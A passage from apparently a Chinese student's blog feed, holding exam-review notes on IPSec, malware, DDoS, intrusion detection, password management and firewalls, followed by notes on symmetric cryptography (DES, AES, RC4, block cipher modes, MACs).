title="防止重放服务"></a>防止重放服务</h4><p>IP是一个无连接不可靠的服务，协议不能保证数据包按照顺序传输，也不能保证所有的包均被传输，因此规定了接收方应实现一个大小为W的窗口（默认值为64），处理过程如下：</p><p>(1)如果接收到的包在窗口中而且是新包，则验证消息认证码(MAC)。若验证通过，就标记窗口中相应的位置。<br>(2)如果接收到的包超过了窗口的右边界而且是新包，则验证MAC，若验证通过，就让窗口前进以使得这个序列号成为窗口的右边界，并标记窗口中的相应位置。<br>(3)如果接收到的包超过了窗口的左边界或者没有通过验证，就丢掉这个包，这是一个可审计事件。</p><h4 id="传输模式和隧道模式-1"><a href="#传输模式和隧道模式-1" class="headerlink" title="传输模式和隧道模式"></a>传输模式和隧道模式</h4><p>下图说明了IPSec ESP服务的两种方式：</p><p><img src="/%5Cimages%5Cchuanshuandsuidao.png"></p><p>传输模式ESP用于加密和认证（认证可选）IP携带的数据。</p><p><img src="/%5Cimages%5Cespcryptandauth.png"></p><p>隧道模式ESP用来加密整个IP包。</p><p>两种模式下的协议架构：</p><p><img src="/%5Cimages%5Cespchuanshu.png"></p><p><img src="/%5Cimages%5Cespsuidao.png"></p><h3 id="安全关联组合"><a href="#安全关联组合" class="headerlink" title="安全关联组合"></a>安全关联组合</h3><p>安全关联可以通过如下两种方式组合成安全关联束：</p><ul><li>传输邻接：在没有激活隧道的情况下，对一个IP包使用多个安全协议。这种组合AH和ESP的方法仅考虑了单层组合，更多层次的嵌套不会带来收益，因为所有的处理都是在一个IPSec实例执行的。</li><li>隧道迭代：指通过IP隧道应用多层安全协议。这种方法考虑了多层嵌套，因为每个隧道都能在路径上的不同IPSec点处起始或者终止。</li></ul><h4 id="认证加保密"><a href="#认证加保密" class="headerlink" title="认证加保密"></a>认证加保密</h4><p>加密和认证组合起来以实现主机之间传送同时需要保密和认证的IP包。</p><p><strong>带认证选项的ESP</strong></p><ul><li>传输模式ESP：被传送到主机的IP载荷使用了认证和加密，但是IP报头不受保护。</li><li>隧道模式ESP：认证作用于被发送到外部IP目的地址的整个IP包，并在目的地进行认证。整个内部IP包由专用机制保护，这是为了传送到内部IP目的地</li></ul><p>这两种情况下，认证作用于密文而不是明文。</p><p><strong>传输邻接</strong></p><p>在加密之后使用认证的另一种方法就是使用两个捆绑在一起的传输SA，内部是ESP SA 外部是AH SA，在这种情况下使用的ESP没有认证选项。由于内部SA是一个传输SA，所以加密仅作用于IP载荷。</p><p><strong>传输-隧道束</strong> </p><p>在加密之前使用认证有几个优点。1.加密可以保护认证数据。2.可能会希望在目的地存储带着报文的认证信息以便将来查阅。</p><h4 id="安全关联的基本组合"><a href="#安全关联的基本组合" class="headerlink" title="安全关联的基本组合"></a>安全关联的基本组合</h4><p>对于主机对主机的SA来说，既可以是传输模式，也可以是隧道模式，除此之外都是隧道模式</p><p><img src="/%5Cimages%5Csazuhe.png"></p><h3 id="因特网密钥交换"><a href="#因特网密钥交换" class="headerlink" title="因特网密钥交换"></a>因特网密钥交换</h3><p>IPSec的密钥管理部分包括密钥的确定和分发。一个典型要求是两个应用之间的通信需要四个密钥：用于完整性和机密性的发送对和接收对。IPSec的体系结构文档要求支持如下两种类型的密钥管理。</p><ul><li>手动类型</li><li>自动类型</li></ul><p>默认的IPSec自动类型密钥管理协议是ISAKMP&#x2F;Oakley，它由以下几部分组成。</p><ul><li>Oakley密钥确定协议：基于DH算法的密钥交换协议</li><li>互联网安全关联和密钥管理协议ISAKMP：为互联网密钥管理提供了一个框架，并提供了特定的协议支持，包括格式和安全属性协商</li></ul><h3 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h3><p>1.举出使用IPSec的例子</p><p>公司之间通过互联网间隙安全虚拟专用网络。增强电子商务的安全性。安全远程访问等等</p><p>2.IPSec提供哪些服务？</p><p>访问控制、无连接完整性、数据源认证、拒绝重放攻击包、机密性、有限流量的机密性</p><p>3.哪些参数标识了SA？哪些参数表现了一个特定SA的本质？</p><p>安全关联由三个参数唯一标识：安全参数索引、IP目标地址、安全协议标识符</p><p>4.传输模式和隧道模式有何区别？</p><p>传输模式主要为上层协议提供保护，也就是说传输模式保护扩展到IP的有效负载。隧道模式为整个IP数据包进行保护。</p><p>5.ESP为社么包括一个填充域？</p><p>如果加密算法要求明文是某些字节数的倍数，则填充字段用于将明文扩展到所需长度。ESP格式要求pad-length和next-header字段在32位字内右对齐，填充字段用于确保此对齐。可以添加额外填充，通过隐藏有效负载的实际长度来提供部分流量机密。</p><p>6.捆绑SA的基本方法是什么？</p><p>传输相邻和迭代隧道（多个隧道组合）</p><p>7.Oakley密钥确定协议和ISAKMP在IPSec中起到什么作用？</p><p>密钥交换等安全属性的协商</p><h1 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h1><ul><li>恶意软件是指为了恶意的目的而蓄意植入系统的软件</li><li>病毒是指通过修改其他程序而达到“感染”目的的软件，这种更改包括复制一个能够继续感染其他程序的病毒程序。</li><li>蠕虫是指通过复制自身，并将副本通过网络传到其他计算机上的程序。当传到其他计算机上，它又开始重复做同样的事情，除了不断繁殖传播之外，蠕虫还经常含有其他有害的功能。</li><li>拒绝服务攻击是指阻止合法用户正常地使用服务。</li><li>分布式拒绝服务攻击是指从多个源端发起的拒绝服务攻击。</li></ul><h2 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h2><h3 id="恶意软件类型"><a href="#恶意软件类型" class="headerlink" title="恶意软件类型"></a>恶意软件类型</h3><h4 id="恶意软件分类"><a href="#恶意软件分类" class="headerlink" title="恶意软件分类"></a>恶意软件分类</h4><p><img src="/%5Cimages%5Ceyiruanjian.png"></p><h3 id="传播-感染内容-病毒"><a href="#传播-感染内容-病毒" class="headerlink" title="传播-感染内容-病毒"></a>传播-感染内容-病毒</h3><h4 id="病毒的本质"><a href="#病毒的本质" class="headerlink" title="病毒的本质"></a>病毒的本质</h4><p>计算机病毒是能够通过修改而达到感染其他程序的一段软件，或者说实际上任何形式的可执行内容都可被感染。这种修改操作包括在原始代码中注入能够复制病毒代码的例程，而这些例程又能够继续感染其他内容。</p><h4 id="病毒的四个阶段"><a href="#病毒的四个阶段" class="headerlink" title="病毒的四个阶段"></a>病毒的四个阶段</h4><ul><li>潜伏阶段，处于休眠，直至被触发</li><li>传染阶段，复制自身，传染其他</li><li>触发阶段，被特定事件所激活</li><li>发作阶段，条件成熟，发作破坏</li></ul><h4 id="病毒的结构"><a href="#病毒的结构" class="headerlink" title="病毒的结构"></a>病毒的结构</h4><ul><li>病毒可以被放在可执行文件首部、尾部或以其他方式嵌入宿主程序，首先被执行的应当是病毒</li><li>简单的病毒</li><li>压缩的病毒</li></ul><h4 id="病毒的压缩过程"><a href="#病毒的压缩过程" class="headerlink" title="病毒的压缩过程"></a>病毒的压缩过程</h4><p>感染后的程序比感染之前的程序长，为防止被检测到，对可执行文件进行压缩，使得无论该程序是否被感染，它的长度都是相同的。</p><h4 id="病毒分类"><a href="#病毒分类" class="headerlink" title="病毒分类"></a>病毒分类</h4><p>按照<strong>感染目标</strong>分类，包括以下类型：</p><ul><li>引导扇区感染病毒：感染主引导记录或者其他引导记录，当系统从包含这种病毒的磁盘启动时，病毒将传播开来。</li><li>文件感染病毒：感染被操作系统或Shell认为是可执行的文件</li><li>宏病毒：在一个应用程序解释宏代码或脚本代码时感染文件</li><li>混合体病毒：用多种方式感染文件。能够感染多种类型的文件，清除该病毒要处理所有可能感染的地方</li></ul><p>按<strong>隐藏策略</strong>进行分类的病毒包括以下几种：</p><ul><li>加密病毒：生成密钥加密病毒。当一个受感染的程序调用时，解密该病毒。当病毒被复制时，另选一个不同的随机密钥加密病毒。</li><li>隐蔽性病毒：具有较好的隐蔽性，逃避反病毒软件的检测</li><li>多态病毒：每次感染表现为不同的形态，使通过病毒特征的检测方法无效。</li><li>变形病毒：每次感染过程中也会表现为不同形态。但变形病毒会改写自身的代码，从而增加检测的难度，既可以改变它们的行为，也可以改变其外观。</li></ul><h3 id="分布式拒绝服务攻击DDos"><a href="#分布式拒绝服务攻击DDos" class="headerlink" title="分布式拒绝服务攻击DDos"></a>分布式拒绝服务攻击DDos</h3><p>分布式SYN突发流量攻击：</p><p><img src="/%5Cimages%5Cddossyn.png"></p><p>分布式ICMP攻击：</p><p><img src="/%5Cimages%5Cddosicmp.png"></p><h4 id="基于DDoS攻击的洪泛攻击分类"><a href="#基于DDoS攻击的洪泛攻击分类" class="headerlink" title="基于DDoS攻击的洪泛攻击分类"></a>基于DDoS攻击的洪泛攻击分类</h4><p><img src="/%5Cimages%5Cdirectddos.png"></p><p><img src="/%5Cimages%5Creflectorddos.png"></p><h4 id="DDos防护"><a href="#DDos防护" class="headerlink" title="DDos防护"></a>DDos防护</h4><p>攻击前：攻击预防</p><p>攻击中：攻击检测和过滤</p><p>攻击后：攻击源追踪</p><h3 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h3><p>1.恶意软件用于传播的三种主要机制是什么？</p><p>恶意软件可用于传播的三种广泛机制是:病毒感染现有可执行文件或解释内容，随后病毒传播到其他系统。利用软件漏洞，通过蠕虫或驱动下载在本地或网络上进行攻击，以允许恶意软件复制。以及社会工程攻击，即说服用户绕过安全机制安装特洛伊木马，或响应网络钓鱼攻击。</p><p>2.恶意软件携带的四种主要类型的载荷是什么？</p><p>恶意软件可能携带的四大类有效负载是:系统或数据文件的损坏;为了使系统成为僵尸代理而窃取服务作为僵尸网的一部分；窃取系统中的信息，尤其是通过键盘记录或问谍软件程序窃取登录、密码或其他个人详细信息；以及恶意软件隐藏了它在系统上的存在，以防止系统试图检测和阻止它。</p><h2 id="入侵者"><a href="#入侵者" class="headerlink" title="入侵者"></a>入侵者</h2><ul><li>对计算机系统或网络的入侵已成为计算机安全最严重的威胁之一。</li><li>入侵检测系统可以提供早期的预警，从而避免或减轻入侵所造成的损失。</li><li>入侵检测涉及对正常行为的模式检测和对与入侵相关的异常行为的模式检测。</li><li>防备入侵一个重要的组成部分就是口令管理，其目标是阻止非授权用户获得其他用户的口令。</li></ul><h3 id="入侵者-1"><a href="#入侵者-1" class="headerlink" title="入侵者"></a>入侵者</h3><h4 id="入侵者行为模式"><a href="#入侵者行为模式" class="headerlink" title="入侵者行为模式"></a>入侵者行为模式</h4><ul><li>用户非法入侵(黑客)与软件非法入侵(病毒)</li><li>三类入侵者 (hackers or crackers):<ul><li>伪装者Masquerader</li><li>违法行为者Misfeasor</li><li>秘密用户Clandestine user</li></ul></li><li>系统入侵已经明显地发展成为一个社会问题</li><li>许多入侵看起来是无害的，但仍消耗大量资源</li><li>可以通过被控制的系统向其他机器发起攻击</li></ul><h4 id="入侵技术"><a href="#入侵技术" class="headerlink" title="入侵技术"></a>入侵技术</h4><p>系统通常维护一个与每个授权用户相关的口令文件。如果系统对该口令文件没有保护，敌手很容易获得口令。<br><strong>口令文件及其保护</strong></p><ul><li>One-way encryption(单向加密), 用口令产生一个密钥用于加密</li><li>Access Control(访问控制)，限制对口令文件的访问</li></ul><p><strong>猜测口令的技术</strong></p><ul><li>尝试默认口令</li><li>穷尽所有短口令(1到3个字符)</li><li>尝试在线词典中的单词或看似口令的单词表(60,000)</li><li>收集用户信息，如爱好、生日、配偶或孩子名</li><li>尝试用户电话、社会安全号，住址</li><li>使用特洛伊木马</li><li>窃听远程用户和主机之间的线路</li></ul><h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><ul><li>有效的入侵检测系统可以看成阻止入侵的屏障</li><li>入侵检测可以收集入侵技术的信息，用以增强入侵阻止工具</li><li>入侵检测建立的前提是假设入侵者的行为在某些情况下不同于合法用户的行为，然而两者仍有重叠部分。放宽定义入侵者行为，会发现更多的入侵者，也会产生大量的“错误肯定”</li><li>为减少错误肯定，严格定义入侵者的行为，将导致错误否定的增加，即无法判断出入侵者。因此在入侵的实践中存在巧妙的折衷</li></ul><p><img src="/%5Cimages%5Cattacker.png"></p><h4 id="入侵检测方法"><a href="#入侵检测方法" class="headerlink" title="入侵检测方法"></a>入侵检测方法</h4><p>统计异常检测Statistical anomaly detection，定义通常的或期望的行为</p><ul><li>阈值检测Treshold detection</li><li>基于形态的检测Profile based</li></ul><p>基于规则的检测Rule based detection，定义合适的行为</p><ul><li>异常检测Anomaly detection</li><li>渗透识别Penetration identidication</li></ul><p>审计记录，入侵检测的基本工具</p><ul><li>原有审计记录</li><li>专门用于检测的审计记录</li></ul><h4 id="基于规则的入侵检测"><a href="#基于规则的入侵检测" class="headerlink" title="基于规则的入侵检测"></a>基于规则的入侵检测</h4><p>通过观察系统中的事件，应用决定给定活动模式是否可疑的规则集来检测入侵行为</p><ul><li>异常检测，类似于统计的异常检测</li><li>基于规则的渗透标识：采用基于专家系统技术的方法, 使用规则来识别已知的渗透, 或那些利用已知弱点的渗透行为。</li></ul><p>NDIX采用启发式规则对行为分配可疑程度</p><p>IDES使用渗透标识模式，当生成审计记录时进行检查，并与规则库相匹配；如果找到匹配，用户的可疑等级会提高；匹配了足够多的规则，等级超过阈值，导致异常报告</p><h4 id="分布式入侵检测"><a href="#分布式入侵检测" class="headerlink" title="分布式入侵检测"></a>分布式入侵检测</h4><p>分布式入侵检测系统要考虑的几个问题</p><ul><li>分布式入侵检测系统可能需要处理不同的审计记录格式</li><li>网络上一个或多个结点将作为数据收集和分析点，需要保证数据完整性和机密性</li><li>集中的或分散的体系结构都可以使用</li></ul><p>分布式入侵检测系统的组成</p><ul><li>主机代理模块：收集主机上有关事件数据，送给中央管理者</li><li>局域网监视代理模块：与主机代理模块类似</li><li>中央管理者模块：接收事件报告，关联事件，检测入侵</li></ul><p><img src="/%5Cimages%5Cruqinjiance.png"></p><h4 id="蜜罐技术"><a href="#蜜罐技术" class="headerlink" title="蜜罐技术"></a>蜜罐技术</h4><p>蜜罐是诱导潜在的攻击者远离重要系统的圈套</p><ul><li>转移攻击重要系统的攻击者</li><li>收集攻击者活动的信息</li><li>希望攻击者在系统中逗留足够的时间，使管理员能对此攻击做出响应</li></ul><p>蜜罐充满合法用户不会访问、但表面看起来有价值的虚假信息，任何对蜜罐的访问都是可疑的<br>蜜罐系统使用的工具包括灵敏的监视器和事件日志<br>初始使用一台有IP地址的机器吸引黑客，现在是建立蜜罐网络，用来模拟一个企业网络。使用实际的或模拟的通信量和数据，一旦黑客进入，管理员可以详细观察到他们的行为，提出防范措施。</p><h3 id="口令管理"><a href="#口令管理" class="headerlink" title="口令管理"></a>口令管理</h3><p><strong>用户ID的作用</strong></p><ul><li>确定用户是否获得访问系统的授权</li><li>确定分配给用户的相应权利</li><li>用于自主的访问控制</li></ul><p><strong>UNIX口令模式</strong><br>用户选择长度大于8个可打印字符的口令, 转换成56位的值, 作为加密例程的密钥输入。加密例程cryp(3)是基于DES的，使用12位的盐值salt修改DES算法。使用由0组成的64位数据输入执行DES算法，输出作为二次加密的输入，加密过程重复25次。<br>产生的64位输出被转换成11个字符序列，密文口令和明文盐值副本一起存放在口令文件相应用户ID项中。</p><p><img src="/%5Cimages%5Cunixpassword.png"></p><h4 id="口令选择策略"><a href="#口令选择策略" class="headerlink" title="口令选择策略"></a>口令选择策略</h4><p><strong>用户教育</strong><br><strong>计算机生成的口令</strong><br>如果口令本质上完全随机，难以被用户接受<br><strong>后验的口令检查</strong><br>系统定期运行口令破解程序来找到可猜测的口令并通知用户修正<br><strong>预先的口令检查</strong></p><ul><li>允许用户选择口令，系统检查口令是否是允许的，使用户在相当大的空间中选择可记忆的且在词典攻击中不太可能猜出的口令。</li><li>简单的规则约束系统，如口令至少8个字符，且应混用</li><li>编译一个可能的口令大词典，不允许用户选择</li><li>基于Bloom过滤器的口令检查技术：一种高效的先验口令检查技术，基于拒绝列表上的单词，已经在许多系统上使用了，包括Linux系统。</li></ul><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>信息系统不断发展完善，每个人都希望与互联网相连或连接到网上，存在安全忧虑，不能很容易地使组织中的各系统得到安全保护，典型地使用防火墙，用以提供边界防御，作为复杂的安全策略的一部分</p><h4 id="什么是防火墙？"><a href="#什么是防火墙？" class="headerlink" title="什么是防火墙？"></a>什么是防火墙？</h4><ul><li>是网络控制和监视的关键点</li><li>用不同的信任与网络相连接</li><li>对网络服务进行强制性限制</li><li>对访问进行审查和控制</li><li>提供NAT和使用监视</li><li>用 IPSec 实现VPN </li><li>对于渗透是免疫的</li></ul><h4 id="防火墙设计目标"><a href="#防火墙设计目标" class="headerlink" title="防火墙设计目标"></a>防火墙设计目标</h4><ul><li><p>所有通信都必须经过防火墙</p></li><li><p>只有被授权的通信才能通过防火墙</p></li><li><p>防火墙本身不能被攻破</p></li></ul><h3 id="防火墙的四种机制"><a href="#防火墙的四种机制" class="headerlink" title="防火墙的四种机制"></a>防火墙的四种机制</h3><h4 id="服务控制"><a href="#服务控制" class="headerlink" title="服务控制"></a>服务控制</h4><p>确定可以访问的互联网服务类型，在IP地址、协议，或端口号的基础上对数据流进行过滤，或提供委托代理，自身作为服务器。</p><h4 id="方向控制"><a href="#方向控制" class="headerlink" title="方向控制"></a>方向控制</h4><p>确定特定服务请求发起和通过的方向，即允许通过防火墙的进入或者离开。</p><h4 id="用户控制"><a href="#用户控制" class="headerlink" title="用户控制"></a>用户控制</h4><p>根据试图访问服务器的用户来控制服务器的访问权限。</p><h4 id="行为控制"><a href="#行为控制" class="headerlink" title="行为控制"></a>行为控制</h4><p>控制特定服务的使用方法。如防火墙可以过滤电子邮件来清除垃圾邮件，或者控制外部用户只能对本地Web服务器上的部分信息访问。</p><h3 id="防火墙的局限性"><a href="#防火墙的局限性" class="headerlink" title="防火墙的局限性"></a>防火墙的局限性</h3><ul><li>防火墙防外不防内</li><li>不能防范绕过防火墙的攻击</li><li>安全性不当的局域网可能受到外部访问</li><li>不能防范病毒</li><li>配置复杂，容易出现漏洞</li><li>往往只认机器不认人，控制粒度较粗</li></ul><h3 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h3><ul><li>包过滤防火墙：对每个传入传出IP数据包的一组应用规则，然后转发或者丢弃该数据包</li><li>状态检测防火墙：状态检测包过滤器通过建造了一个出站TCP连接目录加强了TCP流量的规则。</li><li>应用层网关：也称代理服务器，充当应用程序级流量的中继</li><li>链路层网关</li></ul><p><img src="/%5Cimages%5Cfirewall.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-密码学</title>
    <link href="/blog/2020/05/11/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/blog/2020/05/11/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<p><strong>密码学是网络空间安全的主要的一门专业课之一，主要包括对称加密算法、非对称加密算法以及密码学算法的安全性以及应用。</strong></p><p><img src="/images/fj49.jpg"></p><span id="more"></span><h2 id="对称加密和消息机密性"><a href="#对称加密和消息机密性" class="headerlink" title="对称加密和消息机密性"></a>对称加密和消息机密性</h2><h3 id="对称加密原理"><a href="#对称加密原理" class="headerlink" title="对称加密原理"></a>对称加密原理</h3><p>一个对称加密方案由五部分组成：</p><ul><li>明文</li><li>加密算法</li><li>秘密密钥</li><li>密文</li><li>解密算法</li></ul><h4 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h4><p>密码体制一般从三个不同的方面进行分类：</p><ul><li>明文转换成密文的操作类型</li><li>使用的密钥数：发送者接受者使用同一密钥，该体制就是对称加密算法，反之为非对称加密算法。</li><li>明文处理方式：分组密码一次处理一个输入元素分组，输出与输入对应的分组。流密码连续的处理输入元素，每次产生一个输出元素。</li></ul><h4 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h4><p><img src="/%5Cimages%5Ccryptoana.png"></p><p>计算安全：</p><ul><li>破解密文的代价超出被加密信息的价值</li><li>破解密文需要的时间超出信息的有用寿命</li></ul><h4 id="Feistel密码结构"><a href="#Feistel密码结构" class="headerlink" title="Feistel密码结构"></a>Feistel密码结构</h4><p><img src="/%5Cimages%5Cfeistel.png"></p><p>分组密码的操作取决于下列参数：</p><ul><li>分组大小：分组越大安全性越高效率越低，128bit合理且折中</li><li>密钥大小：越长的密钥越安全，但是也会降低效率，普遍使用密钥长度128bit</li><li>迭代轮数：典型迭代轮数16轮</li><li>子密钥产生算法：复杂度越高，密码破译难度越高</li><li>轮函数：同样，复杂度越高越难以破解</li></ul><h3 id="对称分组加密算法"><a href="#对称分组加密算法" class="headerlink" title="对称分组加密算法"></a>对称分组加密算法</h3><h4 id="数据加密标准DES"><a href="#数据加密标准DES" class="headerlink" title="数据加密标准DES"></a>数据加密标准DES</h4><p><strong>算法描述：</strong></p><p>明文长度为64it，密钥长度为56bit，更长的明文被分为64bit的分组来处理。采用16轮迭代，从原始的56bit密钥产生16组子密钥，每一轮迭代使用一个子密钥。</p><p>DES解密过程在本质上和加密过程相同。规则如下：使用密文作为DES算法的输入，但是子密钥Ki的使用顺序与加密时相反。即第一次使用K16，第二次使用K15，以此类推知道最后一次使用K1.</p><p>穷举密钥消耗的时间：</p><p><img src="/%5Cimages%5Cdesqj.png"></p><h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>3DES使用三个密钥执行三次DES算法，其组合过程依照加密-解密-加密的顺序：</p><p>C &#x3D; E（K3，D（K2，E（K1，P）））</p><p>P &#x3D;  D（K1，E（K2，D（K3，C）））</p><p><img src="/%5Cimages%5C3des.png"></p><h4 id="高级加密标准AES"><a href="#高级加密标准AES" class="headerlink" title="高级加密标准AES"></a>高级加密标准AES</h4><p>AES使用的分组大小为128bit，密钥长度可以为128、192、256bit。常用128bit密钥长度</p><p>算法描述：</p><p>AES没有使用Feistel结构，而是在每轮替换和移位时都并行处理整个数据分组。</p><p>输入密钥被扩展成为44个32比特字的数组w[i]。4个不同的字（128bit）用作每轮的轮密钥。</p><p>进行了4个不同的步骤，一个是移位，3个是替换：</p><ul><li>字节替换：使用S盒来对分组进行逐一的字节替换</li><li>行移位：对行做简单的移位</li><li>列混合：对列的每个字节做替换，是一个与本列全部字节有关的函数</li><li>轮密钥加：将当前分组与一部分扩展密钥简单的按位异或</li></ul><p><img src="/%5Cimages%5Caes.png"></p><p>加密和解密的最后一轮都只包含3个步骤，这么做是为了使密码可逆</p><p><img src="/%5Cimages%5Caesround.png"></p><h3 id="随机数和伪随机数"><a href="#随机数和伪随机数" class="headerlink" title="随机数和伪随机数"></a>随机数和伪随机数</h3><p>满足随机性和不可预测性</p><h4 id="真随机数发生器、伪随机数生成器和为随机函数"><a href="#真随机数发生器、伪随机数生成器和为随机函数" class="headerlink" title="真随机数发生器、伪随机数生成器和为随机函数"></a>真随机数发生器、伪随机数生成器和为随机函数</h4><p>密码应用程序通常利用了随机数生成的算法技术。这些算法具有确定性的特点，因此产生的数列不具有统计上的随机性。虽然如此，如果这个算法很好，那么产生出的数列将会通过很多合理的随机性测试，这种数字被称为<strong>伪随机数字</strong></p><p>真随机数发生器将一个有效的随机源作为输入源，这个源被称为熵源。</p><p><img src="/%5Cimages%5Crandomgen.png"></p><p>伪随机函数(PRF): PRF被用来产生一些固定长度的伪随机比特串。例如对称的加密密钥和随机数。典型的PRF采用种子加上上下文中特定的值作为输入，例如用户名ID和应用程序ID。</p><h3 id="流密码和RC4"><a href="#流密码和RC4" class="headerlink" title="流密码和RC4"></a>流密码和RC4</h3><h4 id="流密码结构"><a href="#流密码结构" class="headerlink" title="流密码结构"></a>流密码结构</h4><p><img src="/%5Cimages%5Cstreamcrypto.png"></p><p>如果伪随机数生成器设计合理，对同样的密钥长度，流密码和分组密码一样安全。流密码的主要优点是流密码与分组密码相比几乎总是更快，使用更少的代码。本节中的示例RC4能用仅仅几行代码实现。最近几年，随着AES的引进，这个优势已经消失了，因为AES可以用软件方式高效实现。比如，Intel AES指令集含有一轮加解密和密钥产生过程使用的机器指令。使用硬件指令实现AES跟仅使用软件方式相比，速度提高了-一个数量级。</p><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><p>由于RC4算法加密是采用的xor，所以，一旦子密钥序列出现了重复，密文就有可能被破解。那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复，因此，推荐在使用RC4算法时，必须对加密密钥进行测试，判断其是否为弱密钥。其不足主要体现于，在无线网络中IV（初始化向量）不变性漏洞。</p><p><img src="/%5Cimages%5Crc4.png"></p><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><h4 id="电子密码本模式ECB"><a href="#电子密码本模式ECB" class="headerlink" title="电子密码本模式ECB"></a>电子密码本模式ECB</h4><p>最简单的一种使用方式是所谓的电子密码本(ECB) 模式，在此模式下明文一-次被处理b比特，而且明文的每-一个分组都使用同-密钥加密。之所以使用术语密码本，是因为对于给定的密钥，每个b比特的明文分组对应唯一的密文。 因此，可以想象一个庞大的密码本，它包含任何可能的b比特明文对应的密文。</p><p>如果同一个64比特的明文分组在消息中出现了不止一次，它总是产生相同的密文。因此，对于过长的消息，ECB模式可能不安全。</p><h4 id="密码分组链接模式CBC"><a href="#密码分组链接模式CBC" class="headerlink" title="密码分组链接模式CBC"></a>密码分组链接模式CBC</h4><p>加密算法输入是当前明文分组与前一密文分组的异或；每个分组使用同一密钥。这就相当于将所有的明文组连接起来了。加密函数每次输入和明文分组之间的关系不固定。</p><p>解密时，用解密算法依次处理每个密文分组。将其结果与前一密文分组进行异或，产生明文分组：</p><p><img src="/%5Cimages%5Caescbc.png"></p><p>为了产生第一个密文分组，将一个初始向量IV和第一个明文分组进行异或。解密时将IV和解密算法的输出进行异或来恢复第一个明文分组。</p><p>发送者和接收着都必须知道IV。为了提高安全性，IV需要像密钥一样进行保护。这可以通过使用ECB加密传送IV来完成。要保护IV的一个理由如下：如果攻击者成功欺骗接收者使其使用一个不同的IV值，接着攻击者就能把明文的第一个分组的某些位取反。</p><h4 id="密码反馈模式CFB"><a href="#密码反馈模式CFB" class="headerlink" title="密码反馈模式CFB"></a>密码反馈模式CFB</h4><p>这种模式可以将任意分组密码转换成流密码。流密码不需要将消息填充为分组的整数倍，它还能实时操作，因此，如果传送字符流，使用面向字符的流密码，每个字符都能被及时的加密并传送。</p><p>加密：加密模块的输入是一个64bit的移位寄存器，初始值设定为某一初始向量IV。加密模块输出的最左边s比特和明文P1的第一单元进行异或，产生密文C1的第一个单元，然后传输，接下来移位寄存器的内容都左移s比特，同时将C1方在移位寄存器的最右边s比特。这个过程一致持续知道所有明文单元都已被加密。</p><p>解密时使用同样的方案，不同的时将接收到的密文单元和加密模块的输出进行异或得到明文单元。注意这里使用的是加密函数，而不是解密函数。</p><p><img src="/%5Cimages%5Caescfb.png"></p><h4 id="计数器模式CTR"><a href="#计数器模式CTR" class="headerlink" title="计数器模式CTR"></a>计数器模式CTR</h4><p><img src="/%5Cimages%5Caesctr.png"></p><p>计数器初始化为某一值，然后随着消息块的增加计数器值增加1 (以2的b次方为模，b为分组长度)。在加密时，计数器被加密然后与明文分组异或来产生密文分组，这里没有链接。当解密时，相同序列的计数器值与密文异或来恢复相对应的明文分组。</p><h2 id="公钥密码和消息认证"><a href="#公钥密码和消息认证" class="headerlink" title="公钥密码和消息认证"></a>公钥密码和消息认证</h2><h3 id="消息认证的方法"><a href="#消息认证的方法" class="headerlink" title="消息认证的方法"></a>消息认证的方法</h3><h4 id="利用常规加密的消息认证"><a href="#利用常规加密的消息认证" class="headerlink" title="利用常规加密的消息认证"></a>利用常规加密的消息认证</h4><p>假设只有发送者和接受者共享一个密钥，那么假定接收者能够识别有效的消息时，只有真正的发送者才能够成功的为对方加密消息。此外，如果消息里带有错误检测码和序列号，则接收者能够确认消息是否被篡改过和序列号是否正常。</p><p>事实上，对数据认证而言只使用对称加密的方法不是一个合适的工具。比如使用ECB加密的分组加密算法，攻击者重排密文分组次序仍然可以解密。</p><h4 id="非加密的消息认证"><a href="#非加密的消息认证" class="headerlink" title="非加密的消息认证"></a>非加密的消息认证</h4><p>这里分析几种不依赖于加密消息认证方法。所有的这些方法都会生成认证标签，并且附在每一条消息上用于传输。消息本身并不会被加密，所以它在目的地可读而与目的地认证功能无关。</p><p><strong>消息认证码</strong></p><p>一种认证技术利用私钥产生一小块数据，称之为<strong>消息认证码</strong>，将其附到消息上。假设只有消息发送者和接收者知道密钥，若收到的认证码与计算的一致，即可证明：</p><ul><li>消息没有被篡改</li><li>接收者确保消息来自合法的发送者</li><li>如果消息中包含序列号，而攻击者不能成功修改序列号，那么接收者就可以确认消息的正确序列</li></ul><p><img src="/%5Cimages%5Cmac.png"></p><p><strong>单向散列函数</strong></p><p>MAC的一种替代方法是使用单向散列函数。如同MAC，散列函数接收变长消息M作为输入，生成定长的消息摘要H(M)作为输出。与MAC不同的是散列不需要密钥，为了消息认证，消息摘要要随消息一起以可信的形式传送。</p><h3 id="安全散列函数"><a href="#安全散列函数" class="headerlink" title="安全散列函数"></a>安全散列函数</h3><h4 id="散列函数的要求"><a href="#散列函数的要求" class="headerlink" 